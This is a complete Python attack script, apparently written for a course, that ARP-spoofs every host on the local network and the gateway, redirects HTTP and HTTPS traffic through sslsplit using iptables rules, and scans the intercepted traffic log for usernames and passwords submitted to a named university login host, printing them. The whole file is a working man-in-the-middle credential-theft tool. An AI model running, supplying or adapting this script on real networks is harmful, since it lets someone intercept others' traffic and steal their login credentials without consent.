#!/usr/bin/env python3
import scapy.all as scapy
import netifaces as ni
import time
import threading
import sys
import subprocess
import math

def get_network_info():
    gateway_ip = ni.gateways()["default"][ni.AF_INET][0]
    interface = ni.gateways()["default"][ni.AF_INET][1]
    mask = ni.ifaddresses(interface)[ni.AF_INET][0]["netmask"]
    cidr = 32
    for i in mask.split('.'):
        cidr -= int(math.log2(256-int(i)))
    return gateway_ip, cidr

def scanning(network):
    global scan
    scan = {}
    request = scapy.ARP(pdst=network) # create an ARP packet and set the network range
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # create an Ethernet packet and set the destination to broadcast
    request_broadcast = broadcast / request # combine ARP request packet and Ethernet frame
    answer = scapy.srp(request_broadcast, timeout=3, verbose=False)[0] # send this to your network and capture the response from different devices
    for send, receive in answer: 
        scan[receive.psrc] = receive.hwsrc # save the IP and MAC address

def print_available_devices(gateway_ip):
    print("Available devices")
    print("-------------------------------------")
    print("IP                MAC                ")
    print("-------------------------------------")
    for key, value in scan.items():
        if key != gateway_ip:
            print("%-17s %17s" % (key, value))

def spoof(target_ip, spoof_ip):
    global scan
    target_mac = scan[target_ip]
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # create a arp request
    scapy.send(packet, verbose=False)


def sslsplit():
    subprocess.run("iptables -t nat -F", shell=True)
    subprocess.run(
        "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080",
        shell=True,
    )
    subprocess.run(
        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443",
        shell=True,
    )
    subprocess.run("touch sslsplit", shell=True)
    """
        Run in debug mode (-D), 
        log the connections (-L sslsplit), 
        specify the key (-k ca.key), 
        specify the cert (-c ca.crt), 
        specify ssl (ssl), 
        configure the proxy (0.0.0.0 8443 tcp 0.0.0.0 8080)
    """
    subprocess.Popen(
        "sslsplit -D -L ./sslsplit -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080",
        shell=True,
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    f = open("./sslsplit", "rb")
    while True:
        host = False
        for line in f.readlines():
            line = line.decode(errors="ignore")
            if "Host: e3.nycu.edu.tw" in line:
                host = True
            if host == True and "username" in line and "password" in line:
                user = line.split("&")
                print("Username: ", user[1][9:])
                print("Password: ", user[2][9:])
    f.close()

def restore(destination_ip, source_ip):
    destination_mac = scan[destination_ip]
    source_mac = scan[source_ip]
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, verbose=False)

def main():
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True) # ip-routing
    gateway_ip, cidr = get_network_info()
    network = gateway_ip + "/" + str(cidr)
    scanning(network)
    print_available_devices(gateway_ip)

    s = threading.Thread(target=sslsplit)
    s.daemon = True
    s.start()

    try:
        print("ARP spoofing...")
        while True:
            for ip in scan.keys():
                if ip != gateway_ip:
                    spoof(ip, gateway_ip)
                    spoof(gateway_ip, ip)
            time.sleep(2)  # waits for two seconds
    except KeyboardInterrupt:
        print("keyboard interrupt........Exiting")
        for ip in scan.keys():
            if ip != gateway_ip:
                restore(gateway_ip, ip)
                restore(ip, gateway_ip)
        subprocess.run("iptables -t nat -F", shell=True) # clean up ip table
        subprocess.run("rm sslsplit ca.key ca.crt", shell=True)
        sys.exit()


if __name__ == "__main__":
    main()